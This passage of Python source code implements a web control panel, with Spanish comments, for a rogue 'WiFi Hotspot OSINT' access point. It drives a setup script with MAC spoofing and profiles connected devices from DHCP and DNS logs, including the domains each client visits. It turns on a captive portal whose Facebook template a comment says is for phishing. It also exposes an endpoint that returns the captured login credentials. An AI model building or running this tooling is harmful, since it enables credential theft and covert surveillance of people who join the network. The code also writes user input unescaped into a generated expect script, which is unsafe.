                    # IP_ASSIGNED: MAC=ae:13:99:2b:8c:41 IP=192.168.50.44
                    ip_match = re.search(r'IP_ASSIGNED:.*MAC=([a-f0-9:]+).*IP=(\d+\.\d+\.\d+\.\d+)', line)
                    if ip_match:
                        mac, ip = ip_match.groups()
                        if ip not in clients:
                            clients[ip] = {
                                'mac': mac,
                                'hostname': None,
                                'device_type': None,
                                'vendor': None,
                                'domains': []
                            }
                    
                    # OSINT: MAC=ae:13:99:2b:8c:41 Hostname=ZTE-7160N
                    hostname_match = re.search(r'OSINT:.*MAC=([a-f0-9:]+).*Hostname=([^\s]+)', line)
                    if hostname_match:
                        mac, hostname = hostname_match.groups()
                        for ip, info in clients.items():
                            if info['mac'] == mac and hostname != ip:
                                info['hostname'] = hostname
        
        # 2. Parsear logs DNS para obtener hostname desde dnsmasq
        dns_files = [f for f in os.listdir(OUTPUT_DIR) if f.startswith('dns_queries_') and f.endswith('.log')]
        if dns_files:
            latest_dns_file = os.path.join(OUTPUT_DIR, sorted(dns_files)[-1])
            
            # Mapeo temporal: transaction_id -> hostname
            transaction_hostnames = {}
            
            with open(latest_dns_file, 'r', errors='ignore') as f:
                for line in f:
                    # FORMA DIRECTA: DHCPACK(wlan1) 192.168.50.44 ae:13:99:2b:8c:41 ZTE-7160N
                    dhcpack_with_name = re.search(r'DHCPACK\(.*?\)\s+(\d+\.\d+\.\d+\.\d+)\s+([a-f0-9:]+)\s+([^\s]+)', line)
                    if dhcpack_with_name:
                        ip, mac, hostname = dhcpack_with_name.groups()
                        if ip in clients and hostname and hostname != ip:
                            clients[ip]['hostname'] = hostname
                    
                    # Capturar: transaction_id + client provides name
                    # 2906898715 client provides name: ZTE-7160N
                    name_match = re.search(r'(\d+)\s+client provides name:\s*([^\s]+)', line)
                    if name_match:
                        transaction_id, hostname = name_match.groups()
                        transaction_hostnames[transaction_id] = hostname
                    
                    # Correlacionar con DHCPOFFER usando transaction_id
                    # 2906898715 DHCPOFFER(wlan1) 192.168.50.44 ae:13:99:2b:8c:41
                    dhcp_match = re.search(r'(\d+)\s+DHCP(?:OFFER|ACK)\(.*?\)\s+(\d+\.\d+\.\d+\.\d+)\s+([a-f0-9:]+)', line)
                    if dhcp_match:
                        transaction_id, ip, mac = dhcp_match.groups()
                        if ip in clients and transaction_id in transaction_hostnames:
                            hostname = transaction_hostnames[transaction_id]
                            if hostname and hostname != ip:
                                clients[ip]['hostname'] = hostname
                    # vendor class: android-dhcp-13
                    vendor_match = re.search(r'(\d+)\s+vendor class:\s*([^\s]+)', line)
                    if vendor_match:
                        transaction_id, vendor = vendor_match.groups()
                        # Buscar la IP asociada con este transaction_id
                        for ip, info in clients.items():
                            if not info['vendor']:
                                info['vendor'] = vendor
                    
                    # Recolectar dominios por IP para inferir tipo de dispositivo
                    # query[A] graph.facebook.com from 192.168.50.85
                    query_match = re.search(r'query\[.*?\]\s+([^\s]+)\s+from\s+(\d+\.\d+\.\d+\.\d+)', line)
                    if query_match:
                        domain, ip = query_match.groups()
                        if ip in clients:
                            clients[ip]['domains'].append(domain)
        
        # 3. Inferir tipo de dispositivo por dominios visitados
        for ip, info in clients.items():
            if info['domains']:
                device_type = infer_device_type(info['domains'])
                if device_type:
                    info['device_type'] = device_type
            
            # Solo usar fallbacks si NO se encontró hostname real
            if not info['hostname'] or info['hostname'] == ip:
                # Intentar con device_type inferido
                if info['device_type']:
                    info['hostname'] = f"{info['device_type']}-Device"
                # Si tiene vendor pero no hostname
                elif info['vendor'] and 'android' in info['vendor'].lower():
                    info['hostname'] = 'Android-Device'
                    info['device_type'] = 'Android'
    
    except Exception as e:
        print(f"Error parseando clientes: {e}")
    
    return clients

def tail_logs():
    """Leer logs y enviar al navegador"""
    files_state = {}
    last_client_update = time.time()
    
    while True:
        try:
            if not os.path.exists(OUTPUT_DIR):
                time.sleep(1)
                continue
            
            # Actualizar clientes cada 5 segundos
            if time.time() - last_client_update > 5:
                clients = parse_clients()
                if clients:
                    state['clients'] = clients
                    socketio.emit('clients_update', {'clients': clients})
                last_client_update = time.time()
            
            # Leer TODOS los archivos relevantes
            for filename in os.listdir(OUTPUT_DIR):
                if not (filename.endswith('.log') or filename.endswith('.txt')):
                    continue
                
                if 'osint_report' in filename or 'pcap' in filename:
                    continue
                
                filepath = os.path.join(OUTPUT_DIR, filename)
                
                # Inicializar tracking si es nuevo
                if filepath not in files_state:
                    files_state[filepath] = 0
                
                try:
                    current_size = os.path.getsize(filepath)
                    
                    if current_size > files_state[filepath]:
                        with open(filepath, 'r', errors='ignore') as f:
                            f.seek(files_state[filepath])
                            for line in f:
                                line = line.rstrip()
                                if line:
                                    socketio.emit('log', {'line': line})
                        files_state[filepath] = current_size
                
                except PermissionError:
                    # Intentar cambiar permisos
                    try:
                        os.chmod(filepath, 0o644)
                    except:
                        pass
                except Exception as e:
                    print(f"Error leyendo {filename}: {e}")
            
            # También leer log de hostapd para eventos de clientes
            hostapd_log = '/tmp/hostapd.log'
            if os.path.exists(hostapd_log):
                if hostapd_log not in files_state:
                    files_state[hostapd_log] = 0
                
                try:
                    current_size = os.path.getsize(hostapd_log)
                    if current_size > files_state[hostapd_log]:
                        with open(hostapd_log, 'r', errors='ignore') as f:
                            f.seek(files_state[hostapd_log])
                            for line in f:
                                line = line.rstrip()
                                if line:
                                    # Emitir log normal
                                    socketio.emit('log', {'line': f"[HOSTAPD] {line}"})
                                    
                                    # Detectar eventos de clientes
                                    # Conexión exitosa: AP-STA-CONNECTED
                                    if 'AP-STA-CONNECTED' in line:
                                        mac = re.search(r'AP-STA-CONNECTED ([a-f0-9:]+)', line)
                                        if mac:
                                            mac_addr = mac.group(1)
                                            hostname = get_hostname_for_mac(mac_addr)
                                            socketio.emit('client_event', {
                                                'type': 'connected',
                                                'mac': mac_addr,
                                                'hostname': hostname,
                                                'message': f'Cliente conectado: {mac_addr}'
                                            })
                                    
                                    # Desconexión: AP-STA-DISCONNECTED
                                    elif 'AP-STA-DISCONNECTED' in line:
                                        mac = re.search(r'AP-STA-DISCONNECTED ([a-f0-9:]+)', line)
                                        if mac:
                                            mac_addr = mac.group(1)
                                            hostname = get_hostname_for_mac(mac_addr)
                                            socketio.emit('client_event', {
                                                'type': 'disconnected',
                                                'mac': mac_addr,
                                                'hostname': hostname,
                                                'message': f'Cliente desconectado: {mac_addr}'
                                            })
                                    
                                    # Autenticación (intento de conexión)
                                    elif 'authentication' in line.lower() and 'STA' in line:
                                        mac = re.search(r'([a-f0-9:]{17})', line)
                                        if mac and 'AP-STA-CONNECTED' not in line:
                                            mac_addr = mac.group(1)
                                            socketio.emit('client_event', {
                                                'type': 'attempt',
                                                'mac': mac_addr,
                                                'hostname': None,
                                                'message': f'Intento de conexión: {mac_addr}'
                                            })
                        
                        files_state[hostapd_log] = current_size
                except Exception as e:
                    pass
            
            # Leer clients.txt para detectar nuevas asignaciones de IP
            clients_files = [f for f in os.listdir(OUTPUT_DIR) if f.startswith('clients_') and f.endswith('.txt')]
            if clients_files:
                latest_clients = os.path.join(OUTPUT_DIR, sorted(clients_files)[-1])
                if latest_clients not in files_state:
                    files_state[latest_clients] = 0
                
                try:
                    current_size = os.path.getsize(latest_clients)
                    if current_size > files_state[latest_clients]:
                        with open(latest_clients, 'r', errors='ignore') as f:
                            f.seek(files_state[latest_clients])
                            for line in f:
                                line = line.rstrip()
                                if 'IP_ASSIGNED' in line:
                                    # IP_ASSIGNED: MAC=ae:13:99:2b:8c:41 IP=192.168.50.44
                                    match = re.search(r'MAC=([a-f0-9:]+)\s+IP=(\d+\.\d+\.\d+\.\d+)', line)
                                    if match:
                                        mac_addr, ip = match.groups()
                                        hostname = get_hostname_for_mac(mac_addr)
                                        socketio.emit('client_event', {
                                            'type': 'connected',
                                            'mac': mac_addr,
                                            'ip': ip,
                                            'hostname': hostname,
                                            'message': f'IP asignada: {ip} → {mac_addr}'
                                        })
                        files_state[latest_clients] = current_size
                except Exception as e:
                    pass
            
            time.sleep(0.5)
            
        except Exception as e:
            print(f"Error en tail_logs: {e}")
            time.sleep(1)

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/api/status')
def api_status():
    # Verificar estado real del hotspot
    actual_running = check_hotspot_running()
    
    # Actualizar estado si no coincide
    if actual_running != state.get('running', False):
        state['running'] = actual_running
        socketio.emit('status_update', {'running': actual_running})
    
    # Devolver estado completo
    return jsonify({
        'running': actual_running,
        'clients': state.get('clients', {})
    })

@app.route('/api/credentials')
def api_credentials():
    # Ruta al archivo de credenciales
    creds_file = os.path.join(OUTPUT_DIR, "captive_credentials.txt")
    
    # Verificar si el archivo existe
    if not os.path.exists(creds_file):
        return jsonify({'success': False, 'error': 'Archivo no encontrado'})
    
    try:
        # Leer el archivo de credenciales
        with open(creds_file, 'r') as f:
            lines = f.readlines()
        
        # Devolver el contenido del archivo
        return jsonify({
            'success': True,
            'content': lines
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/start', methods=['POST'])
def start():
    if state['running']:
        return jsonify({'success': False, 'error': 'Ya está corriendo'})
    
    config = request.json
    state['config'] = config
    
    # Crear script expect
    # Siempre usar modo OSINT (1) independientemente de lo seleccionado
    expect_script = f"""#!/usr/bin/expect -f
set timeout -1
spawn bash {SCRIPT_PATH}
expect "Opción*"
send "1\r"
expect "Ingresa el nombre*"
send "{config['ssid']}\r"
expect "Ingresa la contraseña*"
send "{config['password']}\\r"
expect "Ingresa el canal*"
send "{config['channel']}\\r"
expect "Opción*"
send "{config['mac_spoofing']}\\r"
if {{"{config['mac_spoofing']}" == "3"}} {{
    expect "Ingresa la MAC*"
    send "{config['custom_mac']}\\r"
}}
expect "¿Continuar*"
send "S\\r"
expect eof
"""
    
    expect_file = '/tmp/hotspot_start.exp'
    with open(expect_file, 'w') as f:
        f.write(expect_script)
    
    os.chmod(expect_file, 0o755)
    
    try:
        # Redirigir stderr a un archivo temporal para capturar errores
        error_log = '/tmp/hotspot_web_errors.log'
        with open(error_log, 'w') as f:
            f.write('')  # Limpiar archivo
        
        # Configurar variables de entorno
        env = os.environ.copy()
        if config.get('captive_portal') == '1':
            env['CAPTIVE_PORTAL'] = 'true'
            env['CAPTIVE_DOMAIN'] = config.get('captive_domain', 'conectate-wifi.com')
            env['CAPTIVE_REDIRECT'] = config.get('captive_redirect', 'https://google.com')
            env['CAPTIVE_TEMPLATE'] = 'facebook'  # Usar la página de Facebook para phishing
        else:
            env['CAPTIVE_PORTAL'] = 'false'
            env['CAPTIVE_DOMAIN'] = ''
            env['CAPTIVE_REDIRECT'] = ''
            env['CAPTIVE_TEMPLATE'] = ''
        
        state['process'] = subprocess.Popen(
            ['expect', expect_file],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,  # Combinar stderr con stdout
            preexec_fn=os.setsid,
            env=env
        )
        
        # Thread para leer stdout/stderr del proceso y emitirlo
        def read_process_output():
            while state['process'] and state['process'].poll() is None:
                try:
                    line = state['process'].stdout.readline()
                    if line:
                        line_str = line.decode('utf-8', errors='ignore').rstrip()
                        if line_str:
                            socketio.emit('log', {'line': f"[SCRIPT] {line_str}"})
                            # Detectar errores críticos
                            if 'ERROR' in line_str or 'FAIL' in line_str or 'falló' in line_str:
                                socketio.emit('log', {'line': f"WARNING: {line_str}"})
                except Exception as e:
                    print(f"Error leyendo output del proceso: {e}")
                    break
        
        output_thread = threading.Thread(target=read_process_output, daemon=True)
        output_thread.start()
        
        state['running'] = True
        socketio.emit('status_update', {'running': True})
        
        return jsonify({'success': True})
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/clients', methods=['GET'])
def get_clients():
    """Obtener lista de clientes conectados"""
    return jsonify({'clients': state['clients']})

@app.route('/api/filtered_logs', methods=['GET'])
def filtered_logs():
    """Obtener logs filtrados por IP"""
    ip_filter = request.args.get('ip', 'all')
    logs = []
    
    try:
        if not os.path.exists(OUTPUT_DIR):
            return jsonify({'logs': []})
        
        for filename in os.listdir(OUTPUT_DIR):
            if not (filename.endswith('.log') or filename.endswith('.txt')):
                continue
            
            if 'osint_report' in filename or 'pcap' in filename:
                continue
            
            filepath = os.path.join(OUTPUT_DIR, filename)
            
            try:
                with open(filepath, 'r', errors='ignore') as f:
                    for line in f:
                        line = line.rstrip()
                        if not line:
                            continue
                        
                        # Si es 'all', agregar todo
                        if ip_filter == 'all':
                            logs.append(line)
                        # Si es una IP específica, filtrar
                        elif ip_filter in line:
                            logs.append(line)
            except:
                pass
        
        return jsonify({'logs': logs})
        
    except Exception as e:
        return jsonify({'logs': [], 'error': str(e)})

@app.route('/api/stop', methods=['POST'])
def stop():
    if not state['running']:
        return jsonify({'success': False, 'error': 'No está corriendo'})
    
    try:
        if state['process']:
            # Enviar SIGINT al script bash para que ejecute su cleanup
            os.killpg(os.getpgid(state['process'].pid), signal.SIGINT)
            
            # Esperar a que termine
            try:
                state['process'].wait(timeout=10)
            except subprocess.TimeoutExpired:
                # Si no termina, forzar SIGKILL
                os.killpg(os.getpgid(state['process'].pid), signal.SIGKILL)
        
        # Limpiar procesos remanentes
        subprocess.run(['pkill', '-9', 'hostapd'], capture_output=True)
        subprocess.run(['pkill', '-9', 'dnsmasq'], capture_output=True)
        subprocess.run(['iptables', '-t', 'nat', '-F'], capture_output=True)
        
        state['running'] = False
        state['process'] = None
        socketio.emit('status_update', {'running': False})
        
        return jsonify({'success': True})
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

def cleanup_all():
    """Limpiar todos los procesos del hotspot al salir"""
    print("\n")
    print("=" * 60)
    print("  Deteniendo hotspot...")
    print("=" * 60)
    
    # 1. Matar proceso bash del hotspot si existe
    if state['process']:
        try:
            print("[*] Enviando SIGINT al script bash...")
            os.killpg(os.getpgid(state['process'].pid), signal.SIGINT)
            state['process'].wait(timeout=5)
            print("[OK] Script bash detenido")
        except subprocess.TimeoutExpired:
            print("[!] Timeout, forzando SIGKILL...")
            os.killpg(os.getpgid(state['process'].pid), signal.SIGKILL)
        except Exception as e:
            print(f"[!] Error deteniendo script: {e}")
    
    # 2. Matar procesos conocidos del hotspot
    processes_to_kill = ['hostapd', 'dnsmasq']
    for proc_name in processes_to_kill:
        try:
            result = subprocess.run(['pkill', '-9', proc_name], capture_output=True)
            if result.returncode == 0:
                print(f"[OK] {proc_name} detenido")
        except Exception as e:
            pass
    
    # 3. Limpiar iptables NAT
    try:
        subprocess.run(['iptables', '-t', 'nat', '-F'], capture_output=True)
        print("[OK] Reglas NAT limpiadas")
    except:
        pass
    
    print("=" * 60)
    print("  Panel de control detenido")
    print("=" * 60)

if __name__ == '__main__':
    print("=" * 60)
    print("  WiFi Hotspot OSINT - Panel de Control Web")
    print("=" * 60)
    print()
    print("  Abre tu navegador en:")
    print("  http://localhost:5000")
    print()
    print("  Desde ahi podras:")
    print("  • Configurar el hotspot")
    print("  • Iniciar/detener")
    print("  • Ver logs en tiempo real")
    print()
    print("=" * 60)
    print()
    
    # Verificar expect
    if not os.path.exists('/usr/bin/expect'):
        print("ERROR: expect no esta instalado")
        print("   Ejecuta: sudo apt install expect")
        sys.exit(1)
    
    # Verificar estado inicial del hotspot
    initial_running = check_hotspot_running()
    if initial_running:
        state['running'] = True
        print("[*] Hotspot detectado como activo")
        print()
    
    # Registrar signal handler
    def signal_handler(sig, frame):
        cleanup_all()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Iniciar thread de logs
    log_thread = threading.Thread(target=tail_logs, daemon=True)
    log_thread.start()
    
    # Iniciar servidor
    try:
        socketio.run(app, host='0.0.0.0', port=5000, debug=False)
    except KeyboardInterrupt:
        cleanup_all()
        sys.exit(0)
